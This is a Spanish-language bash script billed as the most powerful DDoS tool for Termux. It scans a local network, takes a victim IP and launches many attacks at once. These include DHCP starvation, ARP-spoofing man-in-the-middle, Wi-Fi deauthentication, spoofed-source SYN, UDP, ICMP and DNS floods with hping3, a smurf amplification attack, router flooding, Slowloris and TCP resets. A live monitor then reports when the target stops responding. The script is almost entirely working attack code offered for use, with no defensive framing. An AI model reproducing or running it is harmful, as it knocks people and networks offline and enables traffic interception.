#!/bin/bash
# =============================================================================
# DDOS-MASTER-TERMUX - El DDoS más potente para Termux
# =============================================================================

# Colores
ROJO='\033[0;31m'
VERDE='\033[0;32m'
AMARILLO='\033[1;33m'
AZUL='\033[0;34m'
MORADO='\033[0;35m'
CIAN='\033[0;36m'
BLANCO='\033[1;37m'
NC='\033[0m'

# Variables
INTERFAZ="wlan0"
VICTIMA=""
ROUTER="192.168.1.1"
MODO=""

# =============================================================================
# VERIFICAR ROOT
# =============================================================================
verificar_root() {
    echo -e "${AZUL}[*] Verificando permisos...${NC}"
    
    if command -v tsu &> /dev/null && [ "$(whoami)" = "root" ]; then
        echo -e "${VERDE}✅ Modo ROOT detectado${NC}"
        MODO="root"
        return 0
    elif [ "$(whoami)" = "root" ]; then
        echo -e "${VERDE}✅ Modo ROOT detectado${NC}"
        MODO="root"
        return 0
    else
        echo -e "${AMARILLO}⚠️ Modo NO-ROOT (limitado)${NC}"
        echo -e "${CIAN}   Para modo root: pkg install tsu && tsu${NC}"
        MODO="noroot"
        return 1
    fi
}

# =============================================================================
# MOSTRAR BANNER
# =============================================================================
mostrar_banner() {
    clear
    echo -e "${ROJO}"
    echo "██████╗ ██████╗  ██████╗ ███████╗    ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ "
    echo "██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗"
    echo "██║  ██║██████╔╝██║   ██║███████╗    ██╔████╔██║███████║█████╗     ██║   █████╗  ██████╔╝"
    echo "██║  ██║██╔══██╗██║   ██║╚════██║    ██║╚██╔╝██║██╔══██║██╔══╝     ██║   ██╔══╝  ██╔══██╗"
    echo "██████╔╝██║  ██║╚██████╔╝███████║    ██║ ╚═╝ ██║██║  ██║██║        ██║   ███████╗██║  ██║"
    echo "╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${BLANCO}              🔥 EL DDoS MÁS POTENTE PARA TERMUX 🔥${NC}"
    echo -e "${CIAN}              Modo: $MODO${NC}"
    echo ""
}

# =============================================================================
# ESCANEAR RED
# =============================================================================
escanear_red() {
    echo -e "${AZUL}[*] Escaneando red local...${NC}"
    echo ""
    
    # Usar nmap o arp-scan según disponibilidad
    if command -v nmap &> /dev/null; then
        nmap -sn 192.168.1.0/24 2>/dev/null | grep -E "Nmap scan|MAC" | head -20
    elif command -v arp-scan &> /dev/null; then
        arp-scan --local 2>/dev/null | head -20
    else
        echo -e "${AMARILLO}   ⚠️ No se pudo escanear. Usa: pkg install nmap${NC}"
    fi
    
    echo ""
    echo -ne "${AMARILLO}IP objetivo: ${NC}"
    read VICTIMA
    
    if [ -z "$VICTIMA" ]; then
        echo -e "${ROJO}❌ IP no válida${NC}"
        exit 1
    fi
    
    echo -e "${VERDE}✅ Objetivo: $VICTIMA${NC}"
}

# =============================================================================
# MODO ROOT - 15 ATAQUES
# =============================================================================
modo_root() {
    echo -e "${ROJO}🔥 INICIANDO MODO ROOT - 15 ATAQUES SIMULTÁNEOS 🔥${NC}"
    echo ""
    
    # Ataque 1: DHCP Starvation
    echo -e "${MORADO}[1/15] DHCP Starvation - Agotando IPs...${NC}"
    if [ -f "herramientas/dhcp_starv.py" ]; then
        python3 herramientas/dhcp_starv.py $INTERFAZ &
    else
        echo -e "${AMARILLO}   ⚠️ No encontrado, omitiendo${NC}"
    fi
    sleep 2
    
    # Ataque 2: ARP Spoofing
    echo -e "${MORADO}[2/15] ARP Spoofing - MITM activado...${NC}"
    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i $INTERFAZ -t $VICTIMA $ROUTER > /dev/null 2>&1 &
    arpspoof -i $INTERFAZ -t $ROUTER $VICTIMA > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ ARP spoofing activado${NC}"
    sleep 2
    
    # Ataque 3: Deauth Attack
    echo -e "${MORADO}[3/15] Deauth Attack - Expulsando del WiFi...${NC}"
    ROUTER_MAC=$(arp -a | grep $ROUTER | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}')
    if [ -n "$ROUTER_MAC" ]; then
        aireplay-ng -0 0 -a $ROUTER_MAC -c $VICTIMA_MAC $INTERFAZ > /dev/null 2>&1 &
        echo -e "${VERDE}   ✅ Deauth activado${NC}"
    else
        echo -e "${AMARILLO}   ⚠️ No se pudo obtener MAC${NC}"
    fi
    sleep 2
    
    # Ataque 4: SYN Flood
    echo -e "${MORADO}[4/15] SYN Flood - Saturación de puertos...${NC}"
    for port in 21 22 23 25 53 80 443 445 3389 8080; do
        hping3 -S --flood -p $port -d 1400 --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    done
    echo -e "${VERDE}   ✅ SYN flood activado${NC}"
    sleep 2
    
    # Ataque 5: ICMP Flood
    echo -e "${MORADO}[5/15] ICMP Flood - Ping de la muerte...${NC}"
    hping3 -1 --flood -d 1400 --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ ICMP flood activado${NC}"
    sleep 2
    
    # Ataque 6: UDP Flood
    echo -e "${MORADO}[6/15] UDP Flood - Saturación UDP...${NC}"
    hping3 -2 --flood --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ UDP flood activado${NC}"
    sleep 2
    
    # Ataque 7: Smurf Attack
    echo -e "${MORADO}[7/15] Smurf Attack - Amplificación...${NC}"
    hping3 -1 --flood -a $VICTIMA 192.168.1.255 -I $INTERFAZ > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ Smurf activado${NC}"
    sleep 2
    
    # Ataque 8: Fragmentación
    echo -e "${MORADO}[8/15] Fragmentación extrema...${NC}"
    hping3 -S --flood -f -p 80 --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ Fragmentación activada${NC}"
    sleep 2
    
    # Ataque 9: GARP Flood
    echo -e "${MORADO}[9/15] GARP Flood - Knockout por MAC...${NC}"
    if [ -f "herramientas/garp_flood.py" ]; then
        python3 herramientas/garp_flood.py $VICTIMA &
    fi
    sleep 2
    
    # Ataque 10: HTTP Flood
    echo -e "${MORADO}[10/15] HTTP Flood - Saturación web...${NC}"
    if [ -f "herramientas/http_flood.py" ]; then
        python3 herramientas/http_flood.py $VICTIMA &
    fi
    sleep 2
    
    # Ataque 11: Slowloris
    echo -e "${MORADO}[11/15] Slowloris - Conexiones lentas...${NC}"
    if [ -f "herramientas/slowloris.py" ]; then
        python3 herramientas/slowloris.py $VICTIMA &
    fi
    sleep 2
    
    # Ataque 12: DNS Flood
    echo -e "${MORADO}[12/15] DNS Flood - Saturación DNS...${NC}"
    hping3 -2 --flood -p 53 --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ DNS flood activado${NC}"
    sleep 2
    
    # Ataque 13: Ataque al router
    echo -e "${MORADO}[13/15] Ataque al router...${NC}"
    for port in 80 443 53 22 8080; do
        hping3 -S --flood -p $port --rand-source $ROUTER -I $INTERFAZ > /dev/null 2>&1 &
    done
    echo -e "${VERDE}   ✅ Router bajo ataque${NC}"
    sleep 2
    
    # Ataque 14: Puerto random
    echo -e "${MORADO}[14/15] Puerto random - Caos total...${NC}"
    for i in {1..10}; do
        random_port=$((RANDOM % 65535 + 1))
        hping3 -S --flood -p $random_port --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    done
    echo -e "${VERDE}   ✅ Caos de puertos${NC}"
    sleep 2
    
    # Ataque 15: TCP Reset
    echo -e "${MORADO}[15/15] TCP Reset - Cerrando conexiones...${NC}"
    if [ -f "herramientas/tcp_reset.py" ]; then
        python3 herramientas/tcp_reset.py $VICTIMA &
    fi
    sleep 2
    
    echo -e "${VERDE}✅ 15 ATAQUES LANZADOS CONTRA $VICTIMA${NC}"
}

# =============================================================================
# MODO NO-ROOT - 8 ATAQUES
# =============================================================================
modo_no_root() {
    echo -e "${AMARILLO}🔥 INICIANDO MODO NO-ROOT - 8 ATAQUES 🔥${NC}"
    echo ""
    
    # Ataque 1: HTTP Flood
    echo -e "${CIAN}[1/8] HTTP Flood - Saturación web...${NC}"
    if [ -f "herramientas/http_flood.py" ]; then
        python3 herramientas/http_flood.py $VICTIMA &
        echo -e "${VERDE}   ✅ HTTP flood activado${NC}"
    else
        echo -e "${AMARILLO}   ⚠️ Herramienta no encontrada${NC}"
    fi
    sleep 2
    
    # Ataque 2: Slowloris
    echo -e "${CIAN}[2/8] Slowloris - Conexiones lentas...${NC}"
    if [ -f "herramientas/slowloris.py" ]; then
        python3 herramientas/slowloris.py $VICTIMA &
        echo -e "${VERDE}   ✅ Slowloris activado${NC}"
    fi
    sleep 2
    
    # Ataque 3: SYN Flood (limitado)
    echo -e "${CIAN}[3/8] SYN Flood - Saturación limitada...${NC}"
    for port in 80 443 8080; do
        hping3 -S --flood -p $port --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    done
    echo -e "${VERDE}   ✅ SYN flood activado${NC}"
    sleep 2
    
    # Ataque 4: UDP Flood (limitado)
    echo -e "${CIAN}[4/8] UDP Flood - Saturación UDP...${NC}"
    hping3 -2 --flood --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ UDP flood activado${NC}"
    sleep 2
    
    # Ataque 5: ICMP Flood (limitado)
    echo -e "${CIAN}[5/8] ICMP Flood - Ping flood...${NC}"
    ping -f $VICTIMA > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ ICMP flood activado${NC}"
    sleep 2
    
    # Ataque 6: TCP Reset
    echo -e "${CIAN}[6/8] TCP Reset - Cerrando conexiones...${NC}"
    if [ -f "herramientas/tcp_reset.py" ]; then
        python3 herramientas/tcp_reset.py $VICTIMA &
        echo -e "${VERDE}   ✅ TCP reset activado${NC}"
    fi
    sleep 2
    
    # Ataque 7: DNS Flood
    echo -e "${CIAN}[7/8] DNS Flood - Saturación DNS...${NC}"
    hping3 -2 --flood -p 53 --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ DNS flood activado${NC}"
    sleep 2
    
    # Ataque 8: Puerto random
    echo -e "${CIAN}[8/8] Puerto random - Caos...${NC}"
    for i in {1..5}; do
        random_port=$((RANDOM % 65535 + 1))
        hping3 -S --flood -p $random_port --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    done
    echo -e "${VERDE}   ✅ Caos de puertos${NC}"
    sleep 2
    
    echo -e "${VERDE}✅ 8 ATAQUES LANZADOS CONTRA $VICTIMA${NC}"
}

# =============================================================================
# MONITOREO
# =============================================================================
monitoreo() {
    echo ""
    echo -e "${AZUL}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLANCO}📊 MONITOREO EN VIVO - $VICTIMA${NC}"
    echo -e "${AZUL}════════════════════════════════════════════════════════════════${NC}"
    
    while true; do
        PING=$(ping -c 1 -W 1 $VICTIMA 2>&1 | grep -oE 'time=[0-9.]+' | cut -d= -f2)
        
        if [ -z "$PING" ]; then
            echo -e "$(date +%H:%M:%S) | ${ROJO}💀 SIN RESPUESTA${NC}"
        elif (( $(echo "$PING > 1000" | bc -l 2>/dev/null) )); then
            echo -e "$(date +%H:%M:%S) | ${ROJO}🔴 $PING ms${NC}"
        elif (( $(echo "$PING > 200" | bc -l 2>/dev/null) )); then
            echo -e "$(date +%H:%M:%S) | ${AMARILLO}🟡 $PING ms${NC}"
        else
            echo -e "$(date +%H:%M:%S) | ${VERDE}🟢 $PING ms${NC}"
        fi
        
        sleep 2
    done
}

# =============================================================================
# MAIN
# =============================================================================
main() {
    mostrar_banner
    verificar_root
    escanear_red
    
    echo ""
    echo -ne "${AMARILLO}¿Iniciar ataque? (s/n): ${NC}"
    read confirm
    
    if [ "$confirm" != "s" ] && [ "$confirm" != "S" ]; then
        echo -e "${ROJO}Ataque cancelado${NC}"
        exit 0
    fi
    
    if [ "$MODO" = "root" ]; then
        modo_root
    else
        modo_no_root
    fi
    
    monitoreo
}

# Ejecutar
main
